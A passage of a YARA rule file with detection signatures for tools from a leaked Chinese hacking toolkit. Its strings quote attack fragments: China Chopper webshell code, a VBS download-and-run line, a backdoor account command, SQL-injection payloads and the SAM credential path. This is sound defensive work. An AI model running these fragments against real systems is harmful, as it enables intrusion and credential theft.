EXE FILE HKTL T1505_003 WEBSHELL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file Webshell.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 10:55:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Windows NT users: Please note that having the WinIce/SoftIce\" fullword ascii\n      $s2 = \"Do you want to cancel the file download?\" fullword ascii\n      $s3 = \"Downloading: %s\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 381KB and all of them\n}\n\nrule CN_Honker_AspxClient_RID2EC2 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file AspxClient.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:28:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2022-12-21\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\tools\\\\hashq\\\\hashq.exe\" wide\n      $s2 = \"\\\\Release\\\\CnCerT.CCdoor.Client.pdb\" ascii\n      $s3 = \"\\\\myshell.mdb\" wide\n      $s4 = \"injectfile\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 3 of them\n}\n\nrule CN_Honker_Fckeditor_RID2E62 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file Fckeditor.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:12:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"explorer.exe http://user.qzone.qq.com/568148075\" fullword wide\n      $s7 = \"Fckeditor.exe\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1340KB and all of them\n}\n\nrule CN_Honker_Codeeer_Explorer_RID312E : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file Codeeer Explorer.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:11:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"Codeeer Explorer.exe\" fullword wide\n      $s12 = \"webBrowser1_ProgressChanged\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 470KB and all of them\n}\n\nrule CN_Honker_SwordHonkerEdition_RID3209 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file SwordHonkerEdition.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:48:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"\\\\bin\\\\systemini\\\\MyPort.ini\" wide\n      $s1 = \"PortThread=200 //\" fullword wide\n      $s2 = \" Port Open -> \" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 375KB and all of them\n}\n\nrule CN_Honker_HASH_PwDump7_RID2EDE : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file PwDump7.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:32:51\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"%s\\\\SYSTEM32\\\\CONFIG\\\\SAM\" fullword ascii\n      $s2 = \"No Users key!\" fullword ascii\n      $s3 = \"NO PASSWORD*********************:\" fullword ascii\n      $s4 = \"Unable to dump file %S\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 380KB and all of them\n}\n\nrule CN_Honker_ChinaChopper_RID2F7B : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file ChinaChopper.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:59:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$m=get_magic_quotes_gpc();$sid=$m?stripslashes($_POST[\\\"z1\\\"]):$_POST[\\\"z1\\\"];$u\" wide\n      $s3 = \"SETP c:\\\\windows\\\\system32\\\\cmd.exe \" fullword wide\n      $s4 = \"Ev al (\\\"Exe cute(\\\"\\\"On+Error+Resume+Next:%s:Response.Write(\\\"\\\"\\\"\\\"->|\\\"\\\"\\\"\\\"\" wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 1 of them\n}\n\nrule CN_Honker_dedecms5_7_RID2E67 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file dedecms5.7.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:13:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"/data/admin/ver.txt\" fullword ascii\n      $s2 = \"SkinH_EL.dll\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 830KB and all of them\n}\n\nrule CN_Honker_Alien_ee_RID2DD9 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file ee.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 10:49:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"GetIIS UserName and PassWord.\" fullword wide\n      $s2 = \"Read IIS ID For FreeHost.\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 50KB and all of them\n}\n\nrule CN_Honker_smsniff_smsniff_RID3112 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file smsniff.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:06:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"smsniff.exe\" fullword wide\n      $s5 = \"SmartSniff\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 267KB and all of them\n}\n\nrule CN_Honker_Happy_Happy_RID2F2A : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file Happy.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:45:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-01-20\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<form.*?method=\\\"post\\\"[\\\\s\\\\S]*?</form>\" fullword wide\n      $s2 = \"domainscan.exe\" fullword wide\n      $s3 = \"http://www.happysec.com/\" wide\n      $s4 = \"cmdshell\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 655KB and 2 of them\n}\n\nrule CN_Honker_T00ls_Lpk_Sethc_v3_0_RID31CD : CHINA DEMO EXE FILE HKTL T1546_008 {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file T00ls Lpk Sethc v3.0.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:38:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL, T1546_008\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"http://127.0.0.1/1.exe\" fullword wide\n      $s2 = \":Rices  Forum:T00Ls.Net  [4 Fucker Te@m]\" fullword wide\n      $s3 = \"SkinH_EL.dll\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 2 of them\n}\n\nrule CN_Honker_NetFuke_NetFuke_RID308A : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file NetFuke.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:44:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Mac Flood: Flooding %dT %d p/s \" fullword ascii\n      $s2 = \"netfuke_%s.txt\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1840KB and all of them\n}\n\nrule CN_Honker_ManualInjection_RID30C8 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file ManualInjection.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:54:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"http://127.0.0.1/cookie.asp?fuck=\" fullword ascii\n      $s16 = \"http://Www.cnhuker.com | http://www.0855.tv\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and all of them\n}\n\nrule CN_Honker_CnCerT_CCdoor_CMD_RID30B2 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file CnCerT.CCdoor.CMD.dll\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:50:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"CnCerT.CCdoor.CMD.dll\" fullword wide\n      $s3 = \"cmdpath\" fullword ascii\n      $s4 = \"Get4Bytes\" fullword ascii\n      $s5 = \"ExcuteCmd\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 22KB and all of them\n}\n\nrule CN_Honker_termsrvhack_RID2F71 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file termsrvhack.dll\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:57:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"The terminal server cannot issue a client license.  It was unable to issue the\" wide\n      $s6 = \"%s\\\\%s\\\\%d\\\\%d\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1052KB and all of them\n}\n\nrule CN_Honker_IIS6_iis6_RID2DBC : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file iis6.com\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 10:44:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"GetMod;ul\" fullword ascii\n      $s1 = \"excjpb\" fullword ascii\n      $s2 = \"LEAUT1\" fullword ascii\n      $s3 = \"EnumProcessModules\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 50KB and all of them\n}\n\nrule CN_Honker_struts2_catbox_RID308E : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file catbox.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:44:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s6 = \"'Toolmao box by gainover www.toolmao.com\" fullword ascii\n      $s20 = \"{external.exeScript(_toolmao_bgscript[i],'javascript',false);}}\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 8160KB and all of them\n}\n\nrule CN_Honker_getlsasrvaddr_RID303D : CHINA DEMO EXE FILE HKTL T1003 {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file getlsasrvaddr.exe - WCE Amplia Security\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:31:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2022-12-21\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL, T1003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s8 = \"pingme.txt\" fullword ascii\n      $s16 = \".\\\\lsasrv.pdb\" ascii\n      $s20 = \"Addresses Found: \" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule CN_Honker_ms10048_x64_RID2DE5 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file ms10048-x64.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 10:51:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"[ ] Creating evil window\" fullword ascii\n      $s2 = \"[+] Set to %d exploit half succeeded\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 125KB and all of them\n}\n\nrule CN_Honker_LogCleaner_RID2EA3 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file LogCleaner.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:23:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \".exe <ip> [(path]\" fullword ascii\n      $s4 = \"LogCleaner v\" ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 250KB and all of them\n}\n\nrule CN_Honker_shell_brute_tool_RID317D : CHINA DEMO EXE FILE HKTL SCRIPT {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file shell_brute_tool.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:24:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"http://24hack.com/xyadmin.asp\" fullword ascii\n      $s1 = \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them\n}\n\nrule CN_Honker_hxdef100_RID2D67 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file hxdef100.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 10:30:21\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s6 = \"BACKDOORSHELL\" fullword ascii\n      $s15 = \"%tmpdir%\" fullword ascii\n      $s16 = \"%cmddir%\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule CN_Honker_GetWebShell_RID2EFD : CHINA DEMO EXE FILE HKTL T1021_002 T1087_002 {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file GetWebShell.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:38:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL, T1021_002, T1087_002\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"echo P.Open \\\"GET\\\",\\\"http://www.baidu.com/ma.exe\\\",0 >>run.vbs\" fullword ascii\n      $s5 = \"http://127.0.0.1/sql.asp?id=1\" fullword wide\n      $s14 = \"net user admin$ hack /add\" fullword wide\n      $s15 = \";Drop table [hack];create table [dbo].[hack] ([cmd] [image])--\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 70KB and 1 of them\n}\n\nrule CN_Honker_Cracker_SHELL_RID2F59 : CHINA DEMO EXE FILE HKTL SCRIPT {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file SHELL.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:53:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"http://127.0.0.1/error1.asp\" fullword ascii\n      $s2 = \"password,PASSWORD,pass,PASS,Lpass,lpass,Password\" fullword wide\n      $s3 = \"\\\\SHELL\" wide\n      $s4 = \"WebBrowser1\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule CN_Honker_MSTSC_can_direct_copy_RID32D6 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file MSTSC_can_direct_copy.EXE\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 14:22:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2022-12-21\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"srv\\\\newclient\\\\lib\\\\win32\\\\obj\\\\i386\\\\mstsc.pdb\" ascii\n      $s2 = \"Clear Password\" fullword wide\n      $s3 = \"/migrate -- migrates legacy connection files that were created with \" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 600KB and all of them\n}\n\nrule CN_Honker_lcx_lcx_RID2DB4 : CHINA DEMO EXE FILE HKTL T1020 T1090 {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - HTRAN - file lcx.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 10:43:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL, T1020, T1090\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"%s -<listen|tran|slave> <option> [-log logfile]\" fullword ascii\n      $s2 = \"=========== Code by lion & bkbll\" ascii\n      $s3 = \"Welcome to [url]http://www.cnhonker.com[/url] \" ascii\n      $s4 = \"-tran   <ConnectPort> <TransmitHost> <TransmitPort>\" fullword ascii\n      $s5 = \"[+] Start Transmit (%s:%d <-> %s:%d) ......\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 30KB and 1 of them\n}\n\nrule CN_Honker_PostgreSQL_RID2E9B : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file PostgreSQL.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:21:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"&http://192.168.16.186/details.php?id=1\" fullword ascii\n      $s2 = \"PostgreSQL_inject\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them\n}\n\nrule CN_Honker_WebRobot_RID2DEB : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file WebRobot.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 10:52:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"%d-%02d-%02d %02d^%02d^%02d ScanReprot.htm\" fullword ascii\n      $s2 = \"\\\\log\\\\ProgramDataFile.dat\" ascii\n      $s3 = \"\\\\data\\\\FilterKeyword.txt\" ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them\n}\n\nrule CN_Honker_Baidu_Extractor_Ver1_0_RID3313 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file Baidu_Extractor_Ver1.0.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 14:32:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"\\\\Users\\\\Admin\" wide\n      $s11 = \"soso.com\" fullword wide\n      $s12 = \"baidu.com\" fullword wide\n      $s19 = \"cmd /c ping \" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and all of them\n}\n\nrule CN_Honker_FTP_scanning_RID2F61 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file FTP_scanning.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:54:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"CNotSupportedE\" fullword ascii\n      $s2 = \"nINet.dll\" fullword ascii\n      $s9 = \"?=MODULE\" fullword ascii\n      $s13 = \"MSIE 6*\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 550KB and all of them\n}\n\nrule CN_Honker_dirdown_dirdown_RID3114 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file dirdown.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:07:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2022-12-21\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"\\\\Decompress\\\\obj\\\\Release\\\\Decompress.pdb\" ascii\n      $s1 = \"Decompress.exe\" fullword wide\n      $s5 = \"Get8Bytes\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 45KB and all of them\n}\n\nrule CN_Honker_Xiaokui_conversion_tool_RID3463 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file Xiaokui_conversion_tool.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 15:28:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"update [dv_user] set usergroupid=1 where userid=2;--\" fullword ascii\n      $s2 = \"To.exe\" fullword wide\n      $s3 = \"by zj1244\" ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 240KB and 2 of them\n}\n\nrule CN_Honker_GroupPolicyRemover_RID3224 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file GroupPolicyRemover.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:52:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"GP_killer.EXE\" fullword wide\n      $s1 = \"GP_killer Microsoft \" fullword wide\n      $s2 = \"SHDeleteKeyA\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 700KB and all of them\n}\n\nrule CN_Honker_WordpressScanner_RID315A : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file WordpressScanner.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:18:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\" fullword ascii\n      $s1 = \"(http://www.eyuyan.com)\" fullword wide\n      $s2 = \"GetConnectString\" fullword ascii\n      $s4 = \"#if !defined(AFX_RESOURCE_DLL) || defined(AFX_TARG_CHS)\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them\n}\n\nrule CN_Honker_Htran_V2_40_htran20_RID314C : CHINA DEMO EXE FILE HKTL T1020 T1090 {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file htran20.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:16:31\"\n      score = 70\n      customer = 